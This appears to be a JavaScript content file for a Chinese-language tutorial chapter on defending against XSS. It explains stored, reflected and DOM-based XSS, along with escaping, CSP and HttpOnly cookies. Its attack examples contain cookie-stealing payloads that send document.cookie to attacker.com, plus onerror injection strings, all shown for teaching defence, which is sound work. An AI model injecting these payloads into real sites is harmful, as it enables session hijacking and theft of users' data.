// 第24章：XSS防护 - 内容数据
window.htmlContentData_24 = {
    section: {
        title: "XSS防护",
        icon: "🛡️"
    },
    topics: [
        {
            type: "concept",
            title: "XSS攻击详解",
            content: {
                description: "XSS（Cross-Site Scripting，跨站脚本攻击）是最常见的Web安全漏洞，攻击者通过注入恶意JavaScript代码来窃取信息、劫持会话或篡改页面内容。",
                keyPoints: [
                    "XSS分为存储型、反射型和DOM型",
                    "核心原因是未过滤用户输入",
                    "可窃取Cookie、会话令牌等敏感信息",
                    "可篡改页面内容进行钓鱼",
                    "防护需要输入验证和输出编码",
                    "CSP是重要的防御手段"
                ]
            }
        },
        {
            type: "comparison",
            title: "XSS攻击类型",
            content: {
                description: "了解三种主要的XSS攻击类型。",
                items: [
                    {
                        name: "存储型XSS",
                        pros: [],
                        cons: [
                            "恶意代码存储在服务器（数据库）",
                            "所有访问用户都会受影响",
                            "危害最大，影响范围广",
                            "常见于评论、留言板等",
                            "持久性攻击"
                        ]
                    },
                    {
                        name: "反射型XSS",
                        pros: [],
                        cons: [
                            "恶意代码在URL参数中",
                            "需要诱导用户点击链接",
                            "不存储在服务器",
                            "常见于搜索、错误页面",
                            "一次性攻击"
                        ]
                    },
                    {
                        name: "DOM型XSS",
                        pros: [],
                        cons: [
                            "完全在客户端执行",
                            "不经过服务器",
                            "利用前端代码漏洞",
                            "难以检测和防护",
                            "常见于SPA应用"
                        ]
                    }
                ]
            }
        },
        {
            type: "code-example",
            title: "存储型XSS攻击与防护",
            content: {
                description: "存储型XSS将恶意代码存储在服务器端。",
                examples: [
                    {
                        title: "攻击示例",
                        code: `<!-- 攻击场景：评论系统 -->

<!-- 1. 攻击者提交恶意评论 -->
评论内容：
<script>
// 窃取cookie
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

或者：
<img src="x" onerror="alert(document.cookie)">

<!-- 2. 服务器存储到数据库 -->
<!-- 未做任何过滤 -->

<!-- 3. 其他用户访问页面 -->
<div class="comment">
    <!-- ❌ 直接输出用户内容 -->
    <script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
    </script>
</div>

<!-- 4. 恶意代码执行，窃取cookie -->`,
                        notes: "存储型XSS影响所有用户"
                    },
                    {
                        title: "防护方法",
                        code: `<!-- 服务器端防护（最重要） -->

// 1. 输入验证和过滤
function validateComment(comment) {
    // 移除脚本标签
    comment = comment.replace(/<script[^>]*>.*?<\\/script>/gi, '');
    
    // 移除事件处理属性
    comment = comment.replace(/on\\w+\\s*=\\s*["'][^"']*["']/gi, '');
    
    // 移除javascript:协议
    comment = comment.replace(/javascript:/gi, '');
    
    return comment;
}

// 2. HTML转义（推荐）
function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// 3. 使用模板引擎自动转义
// 例如：EJS、Handlebars、Pug等都支持自动转义

<!-- 前端显示 -->
<div class="comment">
    <!-- ✅ 转义后的内容 -->
    &lt;script&gt;alert('xss')&lt;/script&gt;
    <!-- 显示为文本，不会执行 -->
</div>`,
                        notes: "服务器端必须验证和转义输入"
                    },
                    {
                        title: "使用textContent",
                        code: `// ❌ 危险：使用innerHTML
const comment = getUserComment();
element.innerHTML = comment;
// 会执行脚本

// ✅ 安全：使用textContent
element.textContent = comment;
// 作为纯文本显示

// ✅ 安全：创建文本节点
const textNode = document.createTextNode(comment);
element.appendChild(textNode);

// ✅ 安全：使用insertAdjacentText
element.insertAdjacentText('beforeend', comment);`,
                        notes: "优先使用textContent而非innerHTML"
                    }
                ]
            }
        },
        {
            type: "code-example",
            title: "反射型XSS攻击与防护",
            content: {
                description: "反射型XSS通过URL参数传递恶意代码。",
                examples: [
                    {
                        title: "攻击示例",
                        code: `<!-- 攻击场景：搜索功能 -->

<!-- 1. 正常搜索 -->
https://example.com/search?q=javascript

<!-- 2. 攻击者构造恶意URL -->
https://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- 3. 服务器端代码（存在漏洞） -->
<!--
<?php
  $query = $_GET['q'];
  echo "搜索结果：" . $query;
?>
-->

<!-- 4. 页面输出（执行恶意代码） -->
<div class="search-result">
    搜索结果：<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
</div>

<!-- 5. 攻击者通过钓鱼等方式诱导用户点击 -->`,
                        notes: "反射型XSS需要诱导用户点击"
                    },
                    {
                        title: "防护方法",
                        code: `<!-- 前端防护 -->

// ❌ 危险：直接使用URL参数
const params = new URLSearchParams(window.location.search);
const query = params.get('q');
document.getElementById('result').innerHTML = '搜索：' + query;

// ✅ 安全：转义输出
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

const query = params.get('q');
document.getElementById('result').innerHTML = '搜索：' + escapeHtml(query);

// ✅ 更安全：使用textContent
document.getElementById('result').textContent = '搜索：' + query;

<!-- 服务器端防护 -->
// 转义所有输出
function renderSearchResult(query) {
    return \`
        <div class="result">
            搜索：\${escapeHtml(query)}
        </div>
    \`;
}`,
                        notes: "转义所有用户输入的输出"
                    }
                ]
            }
        },
        {
            type: "code-example",
            title: "DOM型XSS攻击与防护",
            content: {
                description: "DOM型XSS完全发生在客户端。",
                examples: [
                    {
                        title: "攻击示例",
                        code: `<!-- 攻击场景：前端路由 -->

<!-- 1. 前端代码（存在漏洞） -->
<script>
// ❌ 危险：直接使用location.hash
const page = location.hash.substring(1);
document.getElementById('content').innerHTML = '<h1>' + page + '</h1>';
</script>

<!-- 2. 攻击URL -->
https://example.com/#<img src=x onerror="alert(document.cookie)">

<!-- 3. 代码执行 -->
<div id="content">
    <h1><img src=x onerror="alert(document.cookie)"></h1>
</div>

<!-- 其他危险的DOM API -->
<script>
// ❌ innerHTML
element.innerHTML = userInput;

// ❌ outerHTML
element.outerHTML = userInput;

// ❌ document.write
document.write(userInput);

// ❌ eval
eval(userInput);

// ❌ setTimeout/setInterval with string
setTimeout(userInput, 1000);

// ❌ new Function
new Function(userInput)();

// ❌ location
location.href = 'javascript:' + userInput;
</script>`,
                        notes: "避免使用危险的DOM API"
                    },
                    {
                        title: "防护方法",
                        code: `<!-- 安全的DOM操作 -->

<script>
// ✅ 安全：使用textContent
const page = location.hash.substring(1);
const h1 = document.createElement('h1');
h1.textContent = page;
document.getElementById('content').appendChild(h1);

// ✅ 安全：验证输入
function sanitizeInput(input) {
    // 白名单验证
    const allowed = ['home', 'about', 'contact'];
    return allowed.includes(input) ? input : 'home';
}

const page = sanitizeInput(location.hash.substring(1));

// ✅ 安全：使用DOMPurify库
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;

// ✅ 安全的属性设置
element.setAttribute('data-value', userInput);
// 某些属性仍需验证
if (userInput.startsWith('http://') || userInput.startsWith('https://')) {
    element.href = userInput;
}
</script>`,
                        notes: "使用安全的DOM API和库"
                    }
                ]
            }
        },
        {
            type: "code-example",
            title: "Content Security Policy",
            content: {
                description: "使用CSP作为XSS防护的最后防线。",
                examples: [
                    {
                        title: "禁止内联脚本",
                        code: `<!-- 严格的CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; 
               object-src 'none'; 
               base-uri 'none';">

<!-- ❌ 被阻止：内联脚本 -->
<script>alert('xss')</script>

<!-- ❌ 被阻止：内联事件处理 -->
<img src="x" onerror="alert('xss')">

<!-- ❌ 被阻止：javascript:协议 -->
<a href="javascript:alert('xss')">链接</a>

<!-- ✅ 允许：外部脚本（同源） -->
<script src="/js/app.js"></script>`,
                        notes: "CSP可以阻止大多数XSS攻击"
                    },
                    {
                        title: "使用nonce",
                        code: `<!-- 服务器生成随机nonce -->
<!--
HTTP Header:
Content-Security-Policy: script-src 'nonce-r4nd0m123'
-->

<!-- ✅ 允许：带有正确nonce的脚本 -->
<script nonce="r4nd0m123">
// 内联脚本
console.log('This is allowed');
</script>

<!-- ❌ 被阻止：没有nonce或nonce错误 -->
<script>
console.log('This is blocked');
</script>

<script nonce="wrong">
console.log('This is blocked');
</script>`,
                        notes: "nonce允许特定的内联脚本"
                    }
                ]
            }
        },
        {
            type: "best-practice",
            title: "XSS防护最佳实践",
            content: {
                description: "全面防护XSS攻击：",
                practices: [
                    {
                        title: "输入验证",
                        description: "验证和过滤所有用户输入。",
                        example: `// 白名单验证
function validateUsername(username) {
    return /^[a-zA-Z0-9_-]{3,20}$/.test(username);
}

// 过滤危险字符
function sanitize(input) {
    return input.replace(/[<>"'&]/g, '');
}`
                    },
                    {
                        title: "输出编码",
                        description: "在不同上下文使用正确的编码。",
                        example: `// HTML上下文：HTML转义
function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// JavaScript上下文：JavaScript转义
function escapeJs(str) {
    return str.replace(/\\\\/g, '\\\\\\\\')
               .replace(/'/g, "\\\\'");
}

// URL上下文：URL编码
const encoded = encodeURIComponent(userInput);`
                    },
                    {
                        title: "使用安全的API",
                        description: "避免危险的DOM操作。",
                        example: `// ✅ 安全
element.textContent = userInput;
element.setAttribute('data-value', userInput);

// ❌ 危险
element.innerHTML = userInput;
eval(userInput);
new Function(userInput)();`
                    },
                    {
                        title: "实施CSP",
                        description: "Content Security Policy作为最后防线。",
                        example: `<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self'; 
               object-src 'none';">`
                    },
                    {
                        title: "HttpOnly Cookie",
                        description: "防止JavaScript访问敏感cookie。",
                        example: `// 服务器端设置
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict`
                    }
                ]
            }
        },
        {
            type: "checklist",
            title: "XSS防护检查清单",
            content: {
                description: "确保全面防护XSS攻击：",
                items: [
                    { id: "check24-1", text: "所有用户输入都经过验证" },
                    { id: "check24-2", text: "所有输出都经过HTML转义" },
                    { id: "check24-3", text: "避免使用innerHTML、eval等危险API" },
                    { id: "check24-4", text: "优先使用textContent" },
                    { id: "check24-5", text: "实施Content Security Policy" },
                    { id: "check24-6", text: "敏感cookie设置HttpOnly" },
                    { id: "check24-7", text: "使用DOMPurify等库净化HTML" },
                    { id: "check24-8", text: "URL参数经过验证和编码" },
                    { id: "check24-9", text: "定期进行安全审计" },
                    { id: "check24-10", text: "使用自动化工具扫描XSS漏洞" }
                ]
            }
        }
    ],
    navigation: {
        prev: { title: "安全基础", url: "content.html?chapter=23" },
        next: { title: "CSRF防护", url: "content.html?chapter=25" }
    }
};
